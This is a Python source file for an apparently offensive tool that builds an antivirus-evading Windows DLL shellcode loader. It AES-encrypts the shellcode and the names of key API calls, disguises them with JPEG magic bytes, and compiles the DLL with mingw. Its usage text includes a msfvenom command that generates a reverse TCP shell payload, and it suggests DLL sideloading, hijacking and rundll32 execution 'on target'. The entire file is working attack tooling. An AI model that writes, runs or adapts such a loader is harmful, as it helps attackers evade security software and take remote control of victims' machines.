import sys
import os
from Crypto.Cipher import AES
from os import urandom
import hashlib
import argparse
import subprocess

# PUT YOUR KEY HERE!!!
KEY = "blog.restkhz.com"
KEY = KEY.encode()

strVirtualAlloc = "VirtualAlloc\0"
strRtlMoveMemory = "RtlMoveMemory\0"
strCreateThread = "CreateThread\0"
strVirtualProtect = "VirtualProtect\0"

JPG_HEAD = b''.fromhex('ffd8ff')
JPG_TAIL = b''.fromhex('ffd9') # 00 not in the jpg magic number but just in case


funcList = [strVirtualAlloc, strRtlMoveMemory, strCreateThread, strVirtualProtect]

def pad(s):
    block_size = AES.block_size
    padding = block_size - len(s) % block_size
    return s + bytes([padding] * padding)


def aesenc(plaintext, key):
    k = hashlib.sha256(key).digest()
    IV = urandom(16)
    plaintext = pad(plaintext)
    cipher = AES.new(k, AES.MODE_CBC, IV)
    
    return IV + cipher.encrypt(plaintext)


def makeHeaderFile(payload):
    encKey = f'#define KEY { ', '.join('0x{:02x}'.format(b) for b in bytearray(KEY))}\n'

    # payload
    encPayload = f'#define PAYLOAD {', '.join('0x{:02x}'.format(b) for b in JPG_HEAD + aesenc(payload, KEY) + JPG_TAIL)}\n'

    print(encKey, end='')
    print(encPayload, end='')

    # funcName
    print("\nEncrypting functions:\n")
    encFuncList = []
    for f in funcList:
        encFunc = f'#define {f.upper().rstrip('\0')} {', '.join(('0x{:02x}'.format(b) for b in JPG_HEAD + aesenc(f.encode(), KEY) + JPG_TAIL))}\n'
        print(encFunc, end='')
        encFuncList.append(encFunc)

    # payload and funcname offset
    offsetHead = f'#define OFFSET_HEAD {str(len(JPG_HEAD))}\n'
    offsetTail = f'#define OFFSET_TAIL {str(len(JPG_TAIL))}\n'

    f = open("shellcode.h","w")
    f.write(encKey+encPayload + offsetHead + offsetTail +''.join(encFuncList))
    f.close()

# x86_64-w64-mingw32-gcc template.cpp --shared -o test_ns.dll -lcrypt32 -O2 -fvisibility=hidden -Wl,--dynamicbase -Wl,--nxcompat -DNDEBUG -s
def main():
    parser = argparse.ArgumentParser(
        description="""To generate static AV evaded DLL shellcode loader with AES encrypt.

Example:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 x64/xor_dynamic -f raw > shellcode.raw

python ShellcodeEncrypt2Dll.py --non-standalone shellcode.raw
or
python ShellcodeEncrypt2Dll.py --standalone shellcode.raw
""",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    mode_group = parser.add_mutually_exclusive_group(required=True)
    mode_group.add_argument(
        '--standalone',
        action='store_true',
        help='To make an encrypted DLL WITH KEY stored in the DLL. You can use it for sideload/hijack or in a printnightmare-like scenario.'
    )
    mode_group.add_argument(
        '--non-standalone',
        action='store_true',
        help='To make an encrypted DLL WITHOUT KEY stored in the DLL. You can use it for sideload/rundll32 but you need to pass the key.'
    )

    parser.add_argument(
        'path',
        type=str,
        help='Path to shellcode file.'
    )

    args = parser.parse_args()
    
    f= open(args.path, 'rb')
    payload = f.read()
    makeHeaderFile(payload)

    if args.standalone:
        print("STANDALONE mode")
        command = ['x86_64-w64-mingw32-g++', 'template.cpp', '--shared', '-O0', '-fvisibility=hidden', '-DSTANDALONE', '-fpermissive', '-Wl,--dynamicbase', '-Wl,--nxcompat', '-DNDEBUG', '-s', '-o', 'shell.dll']
        print("You can use it for sideload/hijack or in a printnightmare-like scenario.")
        print("Or just simply: rundll32 <path_to_dll>,EPoint")

    elif args.non_standalone:
        print("NON-STANDALONE mode:")
        command = ['x86_64-w64-mingw32-g++', 'template.cpp', '--shared', '-O0', '-fvisibility=hidden', '-Wl,--dynamicbase', '-fpermissive','-Wl,--nxcompat', '-DNDEBUG', '-s', '-o', 'shell.dll']        
        print(f"Try to run on target: rundll32 <path_to_dll>,EPoint {KEY.decode()}")
    try:
        print("[+] Compiling")
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode != 0:
            print("[-] Compile Failure:")
            print(result.stderr)
        else:
            print("[+] Done: shell.dll")
            print(result.stdout)
            
    except FileNotFoundError:
        print("[-] x86_64-w64-mingw32-gcc didn't work out properly or wasn't found.\nTry: \"sudo apt install mingw-w64\"")
        sys.exit(1)


if __name__ == '__main__':
    main()
